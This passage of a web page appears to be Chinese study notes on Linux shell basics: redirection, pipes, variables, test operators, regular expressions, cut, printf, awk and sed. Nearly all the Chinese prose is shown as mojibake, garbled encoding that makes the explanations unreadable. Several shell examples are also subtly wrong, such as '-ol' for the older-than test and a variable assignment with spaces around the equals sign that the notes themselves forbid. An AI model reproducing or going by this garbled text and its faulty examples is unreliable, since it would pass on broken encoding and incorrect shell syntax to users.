<th>è®¾å¤‡æ–‡ä»¶å</th>
<th>æ–‡ä»¶æè¿°ç¬¦</th>
<th>ç±»å‹</th>
</tr>
</thead>
<tbody><tr>
<td>é”®ç›˜</td>
<td>/dev/stdin</td>
<td>0</td>
<td>æ ‡å‡†è¾“å…¥</td>
</tr>
<tr>
<td>æ˜¾ç¤ºå™¨</td>
<td>/dev/stdout</td>
<td>1</td>
<td>æ ‡å‡†è¾“å‡º</td>
</tr>
<tr>
<td>æ˜¾ç¤ºå™¨</td>
<td>/dev/stderr</td>
<td>2</td>
<td>æ ‡å‡†é”™è¯¯è¾“å‡º</td>
</tr>
</tbody></table>
</li>
<li><p>è¾“å‡ºé‡å®šå‘</p>
</li>
</ul>
<p>æŠŠåŸæœ¬åº”è¯¥è¾“å‡ºåˆ°å±å¹•çš„ä¿¡æ¯ï¼Œå†™åˆ°æ–‡ä»¶ï¼Œç§°ä¸ºé‡å®šå‘</p>
<p><code>å‘½ä»¤&gt;æ–‡ä»¶</code> è¦†ç›–  </p>
<p><code>å‘½ä»¤&gt;&gt;æ–‡ä»¶</code>è¿½åŠ </p>
<p><code>å‘½ä»¤ 2&gt; æ–‡ä»¶</code> &amp; <code>å‘½ä»¤ 2&gt;&gt; æ–‡ä»¶</code> é”™è¯¯è¾“å‡ºé‡å®šå‘</p>
<h3 id="é”™è¯¯æ­£ç¡®éƒ½å¯ä»¥å†™å…¥"><a href="#é”™è¯¯æ­£ç¡®éƒ½å¯ä»¥å†™å…¥" class="headerlink" title="é”™è¯¯æ­£ç¡®éƒ½å¯ä»¥å†™å…¥"></a>é”™è¯¯æ­£ç¡®éƒ½å¯ä»¥å†™å…¥</h3><p><code>å‘½ä»¤ &gt;&gt; æ–‡ä»¶ 2&gt;&amp;1 </code>   è¿½åŠ      </p>
<p><code>å‘½ä»¤ &gt; æ–‡ä»¶ 2&gt;&amp;1</code>    è¦†ç›– /dev/null æ–‡ä»¶é»‘æ´ï¼Œä¸ä¼š</p>
<p>/dev/null æ–‡ä»¶é»‘æ´ï¼Œä¸ä¼šè¾“å‡ºä»»ä½•ç»“æœ</p>
<p># æŠŠæ­£ç¡®çš„å’Œé”™è¯¯çš„åˆ†å¼€ä¿å­˜</p>
<p><code>å‘½ä»¤&gt;&gt;log1 2&gt;&gt;log2</code> æŠŠæ­£ç¡®çš„å‘½ä»¤ç»“æœè¾“å…¥åˆ°log1ï¼ŒæŠŠé”™è¯¯çš„å‘½ä»¤ç»“æœè¾“å‡ºåˆ°log2</p>
<ul>
<li>è¾“å…¥é‡å®šå‘</li>
</ul>
<p>wc -cç»Ÿè®¡å­—èŠ‚æ•°   -wç»Ÿè®¡å•è¯æ•°  -lç»Ÿè®¡è¡Œæ•°</p>
<p>ä»æ–‡ä»¶è¾“å…¥å‘½ä»¤</p>
<p>wc &lt; æ–‡ä»¶</p>
<h4 id="å¤šå‘½ä»¤é¡ºåºæ‰§è¡Œå’Œç®¡é“ç¬¦"><a href="#å¤šå‘½ä»¤é¡ºåºæ‰§è¡Œå’Œç®¡é“ç¬¦" class="headerlink" title="å¤šå‘½ä»¤é¡ºåºæ‰§è¡Œå’Œç®¡é“ç¬¦"></a>å¤šå‘½ä»¤é¡ºåºæ‰§è¡Œå’Œç®¡é“ç¬¦</h4><table>
<thead>
<tr>
<th>å­—ç¬¦</th>
<th>æ ¼å¼</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>;</td>
<td>å‘½ä»¤1 ;å‘½ä»¤2</td>
<td>æ²¡æœ‰é€»è¾‘è”ç³»,ç¬¬ä¸€æ¡å‘½ä»¤æ‰§è¡Œå®Œæ‰§è¡Œç¬¬äºŒæ¡</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>å‘½ä»¤1&amp;&amp;å‘½ä»¤2</td>
<td>ä¸å…³ç³»ï¼Œå‘½ä»¤1æ­£ç¡®æ‰§è¡Œå‘½ä»¤2ï¼Œåä¹‹éƒ½ä¸æ‰§è¡Œ</td>
</tr>
<tr>
<td>||</td>
<td>å‘½ä»¤1||å‘½ä»¤2</td>
<td>æˆ–å…³ç³»ï¼Œå‘½ä»¤1æ­£ç¡®ä¸æ‰§è¡Œ2ï¼Œ1ä¸æ­£ç¡®æ‰§è¡Œ2</td>
</tr>
</tbody></table>
<ul>
<li>ç®¡é“ç¬¦</li>
</ul>
<p>å‘½ä»¤1 |å‘½ä»¤2</p>
<p>å‘½ä»¤1çš„æ­£ç¡®è¾“å‡ºä½œä¸ºå‘½ä»¤2çš„æ“ä½œå¯¹è±¡</p>
<p>ä¾‹å¦‚ï¼š <code>ll -a /etc/ | more</code> moreæœ¬æ¥æ˜¯åˆ†é¡µæ˜¾ç¤ºæ–‡ä»¶å†…çš„å†…å®¹ï¼Œç”¨ç®¡é“ç¬¦é“¾æ¥å¯ä»¥å°†å‘½ä»¤çš„ç»“æœåˆ†é¡µæ˜¾ç¤º</p>
<ul>
<li><p>grep -iå¿½ç•¥å¤§å°å†™ -nè¾“å‡ºè¡Œå· -våå‘æŸ¥æ‰¾ â€“color=autoè‡ªåŠ¨æ˜¾ç¤ºé¢œè‰²</p>
<p>grep æœç´¢å†…å®¹ æ–‡ä»¶å</p>
<p>grepä¹Ÿæ˜¯å¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œï¼Œç»“åˆç®¡é“ç¬¦å¯ä»¥å¯¹å‘½ä»¤çš„è¾“å‡ºè¿›è¡Œæ“ä½œ</p>
</li>
<li><p><code>netstat -an | grep &quot;ESTABLISHED&quot;</code>åˆ—å‡ºç½‘ç»œæœåŠ¡ä¸­å·²ç»å»ºç«‹è¿æ¥çš„</p>
</li>
<li><pre><code> é€šé…ç¬¦
</code></pre>
</li>
</ul>
<p>ï¼Ÿ ä»£è¡¨ä¸€ä¸ªä»»æ„å­—ç¬¦</p>
<p><code>*</code>  ä»£è¡¨0ä¸ªæˆ–è€…å¤šä¸ª</p>
<p>[]  åŒ¹é…å†…å®¹ä¸­ä»»æ„ä¸€ä¸ªå­—ç¬¦</p>
<p>[-]  -è¡¨ç¤ºä¸€ä¸ªèŒƒå›´ï¼Œa-zå°±æ˜¯åŒ¹é…ä¸€ä¸ªå°å†™å­—æ¯</p>
<p>[^] é€»è¾‘é</p>
<h4 id="å®šä¹‰å˜é‡"><a href="#å®šä¹‰å˜é‡" class="headerlink" title="å®šä¹‰å˜é‡"></a>å®šä¹‰å˜é‡</h4><ul>
<li>è‡ªå®šä¹‰å˜é‡ï¼ˆæœ¬åœ°å˜é‡ï¼‰</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">log =&quot;money&quot;</span><br><span class="line">echo $log</span><br><span class="line">set #æ˜¾ç¤ºæ‰€æœ‰çš„å˜é‡</span><br></pre></td></tr></table></figure>

<p>å’Œpyç›¸åŒï¼Œshellä¸­ä¹Ÿä¸éœ€è¦å¯¹å˜é‡è¿›è¡Œå®šä¹‰ï¼Œè¾“å‡ºå˜é‡æ˜¯éœ€è¦åŠ ä¸Š<code>$</code>ç¬¦å·</p>
<p><strong>å˜é‡åå’Œç­‰å·ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼</strong></p>
<p>å•å¼•å·ä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¾“å‡ºï¼ŒåŒå¼•å·è¾“å‡ºå˜é‡çš„å†…å®¹</p>
<p>$ï¼ˆï¼‰ å°æ‹¬å·ä¸­çš„å­—ç¬¦ä¸²ä¼šå½“ä½œç³»ç»Ÿå‘½ä»¤</p>
<p>å¯ä»¥ç”¨è½¬ä¹‰\ç¬¦å·å¿½ç•¥$ç¬¦å·çš„ç‰¹æ®Šæ„ä¹‰ï¼Œåˆ©ç”¨èŠ±æ‹¬å·æ¥é™å®šä¸€ä¸ªå˜é‡çš„å¼€å§‹å’Œç»“æŸæ¯”å¦‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">log = &quot;money&quot;</span><br><span class="line">echo&quot;i have lots of $&#123;log&#125;&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>ç¯å¢ƒå˜é‡</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export å˜é‡å = å˜é‡å€¼ #å®šä¹‰ç¯å¢ƒå˜é‡</span><br><span class="line">env #æŸ¥è¯¢ç¯å¢ƒå˜é‡å‘½ä»¤</span><br><span class="line">unset å˜é‡å #åˆ é™¤ç¯å¢ƒå˜é‡</span><br></pre></td></tr></table></figure>

<p>PATH ç³»ç»ŸæŸ¥çœ‹å‘½ä»¤è·¯å¾„çš„åœ°å€ï¼Œç”¨å†’å·åˆ†å‰²</p>
<p>å°†è‡ªå·±å†™çš„è„šæœ¬æ”¾å…¥ç¯å¢ƒå˜é‡æ¨èç”¨å˜é‡å åŠ <code>PATH = &quot;$PATH&quot;:/è„šæœ¬å­˜æ”¾ç›®å½•</code></p>
<p>PS1 å®šä¹‰ç³»ç»Ÿæç¤ºç¬¦å˜é‡ï¼Œéœ€è¦æ”¹æ—¶å†æŸ¥</p>
<ul>
<li>ä½ç½®å˜é‡</li>
</ul>
<p>ä½ç½®å‚æ•°å˜é‡çš„å˜é‡åç§°æ˜¯å›ºå®šçš„</p>
<table>
<thead>
<tr>
<th>ä½ç½®å‚æ•°å˜é‡</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>$n</td>
<td>nè¡¨ç¤ºæ•°å­—ï¼Œ$0è¡¨ç¤ºå‘½ä»¤æœ¬èº«ï¼Œ$1-$9è¡¨ç¤ºç¬¬ä¸€ä¸ªåˆ°ç¬¬ä¹ä¸ªå‚æ•°ï¼Œ10ä»¥ä¸Šçš„éœ€è¦ç”¨å¤§æ‹¬å·åŒ…å«å¦‚${10}</td>
</tr>
<tr>
<td>$*</td>
<td>åŒ…å«æ‰€æœ‰å‚æ•°çš„åˆ—è¡¨ï¼Œçœ‹ä½œä¸€ä¸ªæ•´ä½“</td>
</tr>
<tr>
<td>$@</td>
<td>åŒ…å«æ‰€æœ‰å‚æ•°çš„è€Œåˆ—è¡¨,ä½†æŠŠæ¯ä¸ªå‚æ•°åŒºåˆ†å¯¹å¾…</td>
</tr>
<tr>
<td>$#</td>
<td>åŒ…å«æ‰€æœ‰å‚æ•°çš„ä¸ªæ•°</td>
</tr>
</tbody></table>
<p>ä½ç½®å‚æ•°ä¸€èˆ¬è·Ÿåœ¨shellè„šæœ¬çš„åé¢<code>bash test.sh å‚æ•°1 å‚æ•°2 å‚æ•°3</code></p>
<p>ä½ç½®å˜é‡ç”¨äºä¼ é€’å‚æ•°ï¼Œå¯ä»¥ç±»æ¯”æˆä¸€ä¸ªå†…å»ºçš„æ•°ç»„ã€‚</p>
<p>$1ä¿å­˜çš„æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ$2ä¿å­˜çš„æ˜¯ç¬¬äºŒä¸ªå‚æ•°â€¦ä»¥æ­¤ç±»æ¨ï¼ˆæ¯”å¦‚cpæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¿å­˜åœ¨$1ï¼‰</p>
<p>$0ç”¨äºä¿å­˜è¯¥è„šæœ¬çš„åå­—</p>
<ul>
<li>é¢„å®šä¹‰å˜é‡</li>
</ul>
<table>
<thead>
<tr>
<th>é¢„å®šä¹‰å˜é‡</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>$ï¼Ÿ</td>
<td>æœ€åä¸€æ¬¡æ‰§è¡Œå‘½ä»¤è¿”å›çŠ¶æ€ã€‚è¿”å›å€¼ä¸º0è¡¨ç¤ºå‘½ä»¤æ­£ç¡®æ‰§è¡Œï¼Œè¿”å›é0å³ä¸ºæŠ¥é”™</td>
</tr>
<tr>
<td>$$</td>
<td>å½“å‰ç³»ç»Ÿçš„è¿›ç¨‹å·(pid)</td>
</tr>
<tr>
<td>$ï¼</td>
<td>åå°è¿è¡Œçš„æœ€åä¸€ä¸ªè¿›ç¨‹å·</td>
</tr>
</tbody></table>
<h3 id="æ¥æ”¶é”®ç›˜è¾“å…¥"><a href="#æ¥æ”¶é”®ç›˜è¾“å…¥" class="headerlink" title="æ¥æ”¶é”®ç›˜è¾“å…¥"></a>æ¥æ”¶é”®ç›˜è¾“å…¥</h3><p><code>read [é€‰é¡¹] [å˜é‡å]</code></p>
<p>-p æç¤ºä¿¡æ¯</p>
<p>-t ç§’æ•°</p>
<p>-n å­—ç¬¦æ•°ï¼Œæ¥å—åˆ°nä¸ªå­—ç¬¦ä¹‹åç›´æ¥æ‰§è¡Œä¸ç”¨å›è½¦</p>
<p>-s éšè—è¾“å…¥æ•°æ®</p>
<h3 id="æ•°å€¼è¿ç®—å’Œè¿ç®—ç¬¦"><a href="#æ•°å€¼è¿ç®—å’Œè¿ç®—ç¬¦" class="headerlink" title="æ•°å€¼è¿ç®—å’Œè¿ç®—ç¬¦"></a>æ•°å€¼è¿ç®—å’Œè¿ç®—ç¬¦</h3><p><code>declare [+/-] [é€‰é¡¹]å˜é‡å</code></p>
<p><code>-</code> ç»™å˜é‡è®¾å®šçƒˆæ€§æ•°æ®</p>
<p><code>+</code> å–æ¶ˆç±»å‹å±æ€§</p>
<p>-i è®¾å®šå˜é‡ä¸ºæ•´å‹</p>
<p>-x å°†å˜é‡å£°æ˜ä¸ºç¯å¢ƒå˜é‡</p>
<p>-p æ˜¾ç¤ºæŒ‡å®šçš„å˜é‡ä¸ºè¢«å£°æ˜çš„ç±»å‹</p>
<ul>
<li>exprå’Œletæ•°å€¼è¿ç®—å·¥å…·</li>
</ul>
<p> $(expr $a + $b)</p>
<h3 id="å˜é‡æµ‹è¯•å’Œå†…å®¹æ›¿æ¢"><a href="#å˜é‡æµ‹è¯•å’Œå†…å®¹æ›¿æ¢" class="headerlink" title="å˜é‡æµ‹è¯•å’Œå†…å®¹æ›¿æ¢"></a>å˜é‡æµ‹è¯•å’Œå†…å®¹æ›¿æ¢</h3><p>ä½œç”¨ï¼šé€šè¿‡xçš„å€¼æ¥åˆ¤æ–­yæ˜¯å¦æœ‰å€¼</p>
<p>ç”¨åˆ°å†æŸ¥</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/%E5%8F%98%E9%87%8F%E6%B5%8B%E8%AF%95%E5%92%8C%E5%86%85%E5%AE%B9%E6%9B%BF%E6%8D%A2.jpg" alt="å˜é‡æµ‹è¯•å’Œå†…å®¹æ›¿æ¢"></p>
<h4 id="æ•°å€¼è¿ç®—-è¿ç®—å¼-æˆ–è€…-è¿ç®—å¼-ï¼ˆå¸¸ç”¨ï¼‰"><a href="#æ•°å€¼è¿ç®—-è¿ç®—å¼-æˆ–è€…-è¿ç®—å¼-ï¼ˆå¸¸ç”¨ï¼‰" class="headerlink" title="æ•°å€¼è¿ç®— **$((è¿ç®—å¼)) æˆ–è€…$[è¿ç®—å¼]**ï¼ˆå¸¸ç”¨ï¼‰"></a>æ•°å€¼è¿ç®— **$((è¿ç®—å¼)) æˆ–è€…$[è¿ç®—å¼]**ï¼ˆå¸¸ç”¨ï¼‰</h4><p>ä¸¤ä¸ªå°æ‹¬å·æˆ–è€…ä¸€ä¸ªä¸­æ‹¬å·å°±å¯ä»¥è¿›è¡Œæ•°å€¼è¿ç®—</p>
<h3 id="åˆ¤æ–­ç”¨æˆ·çš„å‚æ•°-æ¡ä»¶åˆ¤æ–­"><a href="#åˆ¤æ–­ç”¨æˆ·çš„å‚æ•°-æ¡ä»¶åˆ¤æ–­" class="headerlink" title="åˆ¤æ–­ç”¨æˆ·çš„å‚æ•°(æ¡ä»¶åˆ¤æ–­)"></a>åˆ¤æ–­ç”¨æˆ·çš„å‚æ•°(æ¡ä»¶åˆ¤æ–­)</h3><p>æµ‹è¯•è¯­å¥ï¼š<code>[ ]</code>,ä¸€ä¸ªä¸­æ‹¬å·ä¸¤è¾¹éƒ½è¦æœ‰ä¸€ä¸ªç©ºæ ¼</p>
<table>
<thead>
<tr>
<th>æ“ä½œç¬¦å·</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>-d</td>
<td>æ–‡ä»¶æ˜¯å¦ä¸ºç›®å½•ç±»å‹</td>
</tr>
<tr>
<td>-e</td>
<td>æ–‡ä»¶æ˜¯å¦å­˜åœ¨</td>
</tr>
<tr>
<td>-f</td>
<td>æ˜¯å¦ä¸ºä¸€èˆ¬æ–‡ä»¶</td>
</tr>
<tr>
<td>-r</td>
<td>æ˜¯å¦æœ‰æƒé™è¯»å–</td>
</tr>
<tr>
<td>-w</td>
<td>æ˜¯å¦æœ‰æƒé™å†™</td>
</tr>
<tr>
<td>-x</td>
<td>æ˜¯å¦æœ‰æƒé™æ‰§è¡Œ</td>
</tr>
</tbody></table>
<p><strong>æ³¨æ„ï¼šè¿”å›å€¼ä¸º0è¡¨ç¤ºçœŸï¼Œ1è¡¨ç¤ºå‡</strong></p>
<p>[ -d /etc ] &amp;&amp; echoâ€yesâ€ || echo â€œnoâ€</p>
<p><code>$?</code>å¯ä»¥æµ‹è¯•ä¸Šæ¡æµ‹è¯•è¯­å¥çš„æ‰§è¡Œçš„è¿”å›å€¼</p>
<ul>
<li>æ–‡ä»¶æ¯”è¾ƒ</li>
</ul>
<p><code>file1 -nt file2</code> æ–‡ä»¶1æ˜¯å¦æ¯”æ–‡ä»¶2æ–°,new than</p>
<p><code>file1 -ol file2</code>æ–‡ä»¶1æ˜¯å¦æ¯”æ–‡ä»¶2æ—§</p>
<p><code>file1 -ef file2</code> æ˜¯å¦ä¸ºåŒä¸€ä¸ªæ–‡ä»¶,æ¯”å¦‚åˆ¤æ–­ä¸¤ä¸ªæ–‡ä»¶æ˜¯å¦æ˜¯ç¡¬è¿æ¥</p>
<ul>
<li>æ•´æ•°ä¹‹é—´æ¯”è¾ƒ</li>
</ul>
<p>-eq  equal</p>
<p>-ne not equal</p>
<p>-gt great than</p>
<p>-lt low than</p>
<p>-ge great eauql</p>
<p>-le low equal</p>
<ul>
<li>å­—ç¬¦ä¸²åˆ¤æ–­</li>
</ul>
<p>-z å­—ç¬¦ä¸² æ˜¯å¦ä¸ºç©º(ç©ºtrue)</p>
<p>-n å­—ç¬¦ä¸²     æ˜¯å¦ä¸ºç©º(éç©º ture)</p>
<p>å­—ç¬¦ä¸²1 == å­—ç¬¦ä¸²2</p>
<p>å­—ç¬¦ä¸²1 != å­—ç¬¦ä¸²2</p>
<ul>
<li>å¤šé‡æ¡ä»¶åˆ¤æ–­</li>
</ul>
<p><code>åˆ¤æ–­1 -a åˆ¤æ–­2</code> é€»è¾‘ä¸,and</p>
<p><code>åˆ¤æ–­1 -o åˆ¤æ–­2</code> é€»è¾‘æˆ–,or</p>
<p><code>! åˆ¤æ–­,</code>å–å</p>
<h3 id="ç¯å¢ƒå˜é‡-1"><a href="#ç¯å¢ƒå˜é‡-1" class="headerlink" title="ç¯å¢ƒå˜é‡"></a>ç¯å¢ƒå˜é‡</h3><p>è®©å½“å‰çš„é…ç½®æ–‡ä»¶ç”Ÿæ•ˆï¼Œä¸ç”¨é‡å¯</p>
<p><code>source é…ç½®æ–‡ä»¶</code> æˆ–è€…`. é…ç½®æ–‡ä»¶</p>
<ul>
<li>ç¯å¢ƒå˜é‡é…ç½®æ–‡ä»¶</li>
</ul>
<p>PATH        HISSIZE                 PS1                HOSTNAME</p>
<ul>
<li>ç¯å¢ƒå˜é‡é…ç½®æ–‡ä»¶å­˜æ”¾ä½ç½®</li>
</ul>
<p>etcç›®å½•ä¸‹ä»»ä½•ç”¨æˆ·éƒ½ä¼šç”Ÿæ•ˆ</p>
<p><code>/etc/profile</code></p>
<p><code>/etc/profile.d/*.sh</code></p>
<p><code>~/.bash_profile</code>  æ­¤æ¡å’Œä¸‹ä¸€æ¡æ˜¯ç™»å½•ç”¨æˆ·çš„å®¶ç›®å½•åªæœ‰å½“å‰ç™»å½•ç”¨æˆ·å’Œrootå¯ä»¥æ‰§è¡Œå’ŒæŸ¥çœ‹</p>
<p><code>~/.bashrc</code></p>
<p><code>/etc/bashrc</code></p>
<ul>
<li><p>å…¶ä»–ç¯å¢ƒå˜é‡</p>
<ul>
<li><p>æ³¨é”€æ—¶ç”Ÿæ•ˆçš„ç¯å¢ƒå˜é‡é…ç½®æ–‡ä»¶</p>
<p><code>~/.bash_logout</code></p>
</li>
<li><p>å†å²å‘½ä»¤é…ç½®æ–‡ä»¶</p>
<p><code>~/.bash_history</code></p>
</li>
<li><p>æœ¬åœ°ç»ˆç«¯ç™»å½•ä¿¡æ¯/etc/issue</p>
</li>
<li><p>è¿œç¨‹ç™»å½•ä¿¡æ¯/etc/issue.net</p>
</li>
<li><p>ç™»å½•åä¿¡æ¯/etc/motd</p>
</li>
</ul>
</li>
</ul>
<h3 id="æ­£åˆ™è¡¨è¾¾å¼"><a href="#æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼"></a>æ­£åˆ™è¡¨è¾¾å¼</h3><ul>
<li>é€šé…ç¬¦æ˜¯ç”¨æ¥åŒ¹é…ç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶åï¼Œé€šé…ç¬¦æ˜¯å®Œå…¨åŒ¹é…ï¼›æ­£åˆ™åŒ¹é…çš„æ˜¯æ–‡ä»¶ä¸­çš„åŒ¹é…ç¬¦åˆæ¡ä»¶çš„å­—ç¬¦ä¸²ï¼Œæ˜¯åŒ…å«åŒ¹é…</li>
</ul>
<h4 id="åŸºç¡€æ­£åˆ™è¡¨è¾¾å¼"><a href="#åŸºç¡€æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="åŸºç¡€æ­£åˆ™è¡¨è¾¾å¼"></a>åŸºç¡€æ­£åˆ™è¡¨è¾¾å¼</h4><table>
<thead>
<tr>
<th>å…ƒå­—ç¬¦</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>å‰ä¸€ä¸ªå­—ç¬¦åŒ¹é…0æ¬¡æˆ–è€…ä»ä»¥å¤šæ¬¡</td>
</tr>
<tr>
<td>.</td>
<td>åŒ¹é…é™¤äº†æ¢è¡Œç¬¦å¤–çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td>^</td>
<td>åŒ¹é…è¡Œé¦–.ä¾‹å¦‚^helloä¼šåŒ¹é…ä»¥helloå¼€å¤´çš„è¡Œ</td>
</tr>
<tr>
<td>$</td>
<td>åŒ¹é…è¡Œå°¾</td>
</tr>
<tr>
<td>[]</td>
<td>åŒ¹é…æ‹¬å·ä¸­æŒ‡å®šçš„ä»»æ„ä¸€ä¸ªå­—ç¬¦,åªåŒ¹é…ä¸€ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td>[^]</td>
<td>å–å</td>
</tr>
<tr>
<td>\</td>
<td>è½¬ä¹‰</td>
</tr>
<tr>
<td><code>\&#123;n\&#125;</code></td>
<td>å‰é¢å‡ºç°çš„å­—ç¬¦æ°å¥½å‡ºç°næ¬¡(è¿™é‡Œ\æ˜¯è½¬ä¹‰,å–æ¶ˆ{}}ç‰¹æ®Šå«ä¹‰)</td>
</tr>
<tr>
<td><code>\&#123;n,\&#125;</code></td>
<td>è¡¨ç¤ºå‰é¢çš„å­—ç¬¦å‡ºç°ä¸å°äºnæ¬¡</td>
</tr>
<tr>
<td><code>\&#123;n,m\&#125;</code></td>
<td>è¡¨ç¤ºå‰é¢çš„å­—ç¬¦è‡³å°‘å‡ºç°næ¬¡è‡³å¤šå‡ºç°mæ¬¡</td>
</tr>
</tbody></table>
<p><code>grep &quot;æ­£åˆ™è¡¨è¾¾å¼&quot; æ–‡ä»¶å</code></p>
<h3 id="å­—ç¬¦ä¸²æˆªå–å‘½ä»¤"><a href="#å­—ç¬¦ä¸²æˆªå–å‘½ä»¤" class="headerlink" title="å­—ç¬¦ä¸²æˆªå–å‘½ä»¤"></a>å­—ç¬¦ä¸²æˆªå–å‘½ä»¤</h3><h4 id="cut-å­—ç¬¦æˆªå–å‘½ä»¤"><a href="#cut-å­—ç¬¦æˆªå–å‘½ä»¤" class="headerlink" title="cut å­—ç¬¦æˆªå–å‘½ä»¤"></a>cut å­—ç¬¦æˆªå–å‘½ä»¤</h4><ul>
<li>(åªèƒ½é€‚ç”¨äºtabè¿›è¡Œåˆ†å‰²æˆ–è€…æŒ‡å®šçš„ç¬¦å·è¿›è¡Œåˆ†å‰²æƒ…å†µæ¯”å¦‚â€:â€ç”¨-dæŒ‡å®š)</li>
</ul>
<p><code>cut [option] æ–‡ä»¶</code></p>
<p>-f åˆ—å·     æå–ç¬¬å‡ åˆ— </p>
<p>-d åˆ†éš”ç¬¦ æŒ‰ç…§æŒ‡å®šçš„åˆ†éš”ç¬¦åˆ†å‰²åˆ—</p>
<p>æ¯”å¦‚:test.txtæ–‡ä»¶ä¸­æœ‰ab!cdçš„æ•°æ®</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cut -d &quot;!&quot; -f 1#è¾“å‡ºab</span><br><span class="line">cut -d &quot;!&quot; -f 2#è¾“å‡ºcd</span><br></pre></td></tr></table></figure>



<h4 id="printf-å‘½ä»¤"><a href="#printf-å‘½ä»¤" class="headerlink" title="printf å‘½ä»¤"></a>printf å‘½ä»¤</h4><p><code>printf &#39;è¾“å‡ºç±»å‹è¾“å‡ºæ ¼å¼&#39; è¾“å‡ºå†…å®¹</code></p>
<p>è¾“å‡ºå†…å®¹:</p>
<p>%ns :è¾“å‡ºå­—ç¬¦ä¸².næ˜¯è¡¨ç¤ºå‡ ä¸ªå­—ç¬¦</p>
<p>%ni:è¾“å‡ºæ•´æ•°,nè¡¨å“¦æ˜¯å‡ ä¸ªæ•°å­—</p>
<p>%m.nf è¾“å‡ºæµ®ç‚¹æ•°,mè¡¨ç¤ºæ€»å…±è¾“å‡ºå‡ ä¸ªä½,nè¡¨ç¤ºå°æ•°ä½æ•°</p>
<p>è¾“å‡ºæ ¼å¼:</p>
<p>  \n æ¢è¡Œ</p>
<p>\t åˆ¶è¡¨</p>
<p>\r å›è½¦</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">printf &#x27;%s&#x27; test.txt # out:&quot;test.txt&quot;</span><br><span class="line">cat test.txt | printf &#x27;%s&#x27; #æ²¡æœ‰è¾“å‡º</span><br><span class="line">printf &#x27;%s&#x27; $(cat student.txt) #åªæœ‰è¿™ç§æ‹¬å·é‡Œç³»ç»Ÿå‘½ä»¤çš„æ–¹å¼æ‰å¯</span><br></pre></td></tr></table></figure>



<h4 id="awk-å‘½ä»¤"><a href="#awk-å‘½ä»¤" class="headerlink" title="awk å‘½ä»¤"></a>awk å‘½ä»¤</h4><p><code>awk &#39;æ¡ä»¶1 &#123;åŠ¨ä½œ1&#125; æ¡ä»¶2&#123;åŠ¨ä½œ2&#125;...&#39; æ–‡ä»¶å</code></p>
<p>BEGIN{print â€œtest!â€} #ä¼šåœ¨æ‰€æœ‰çš„æ‰§è¡Œä¹‹å‰å®Œæˆ</p>
<p>END    #åœ¨æ‰€æœ‰å‘½ä»¤æ‰§è¡Œä¹‹åå†æ‰§è¡Œ</p>
<p>{FS=â€:â€} #æŒ‡å®šåˆ†éš”ç¬¦</p>
<p>åŠ¨ä½œ:</p>
<ol>
<li>æµç¨‹æ§åˆ¶</li>
<li>æ ¼å¼åŒ–è¾“å‡º</li>
</ol>
<p>ä¸¾ä¾‹:è¾“å‡ºéè§„åˆ™æ•°é‡ç©ºæ ¼çš„å‘½ä»¤æˆªå–</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">df -h | awk &#x27;&#123;print $1 &quot;\t&quot; $5&#125;&#x27; #è¾“å‡ºç³»ç»Ÿå®¹é‡å ç”¨çš„ç¬¬ä¸€åˆ—å’Œç¬¬äº”åˆ—</span><br></pre></td></tr></table></figure>



<h4 id="sed-å‘½ä»¤"><a href="#sed-å‘½ä»¤" class="headerlink" title="sed å‘½ä»¤"></a>sed å‘½ä»¤</h4><p>sedå‘½ä»¤ä¹Ÿæ˜¯ä¸€ä¸ªæ–‡æœ¬ç¼–è¾‘å™¨,å’Œvimä¸€æ ·,ä½†æ˜¯vimåªèƒ½ä¿®æ”¹æ–‡æœ¬,ä¸èƒ½ä¿®æ”¹å‘½ä»¤è¾“å‡º</p>
<p><code>sed [option] &#39;[åŠ¨ä½œ]&#39; æ–‡ä»¶å</code></p>
<p>-n     åŠ äº†-nä¼šåªå°†sedå‘½ä»¤å¤„ç†çš„ç»“æœè¾“å‡ºåˆ°å±å¹•</p>
<p>-e å…è®¸å¯¹è¾“å‡ºåº”ç”¨å¤šæ¡sedå‘½ä»¤ç¼–è¾‘</p>
<p>-i ç”¨sedçš„ä¿®æ”¹ç»“æœç›´æ¥ä¿®æ”¹è¯»å–æ•°æ®çš„æ–‡ä»¶,è€Œä¸æ˜¯ç”±å±å¹•è¾“å‡º</p>
<p>åŠ¨ä½œ:</p>
<p>a : è¿½åŠ ,æ·»åŠ ä¸€è¡Œæˆ–è€…å¤šè¡Œ,æ·»åŠ å¤šè¡Œæ—¶è¦åŠ \è¡¨ç¤ºæ•°æ®æœªå®Œç»“,2aè¡¨ç¤ºç¬¬äºŒè¡Œä¹‹åæ’å…¥</p>
<p>c : è¡Œæ›¿æ¢,ç”¨cä¹‹åçš„å­—ç¬¦æ›¿æ¢åŸæ•°æ®è¡Œ,æ›¿æ¢å¤šè¡Œæ—¶è¦åŠ \è¡¨ç¤ºæ•°æ®æœªå®Œç»“</p>
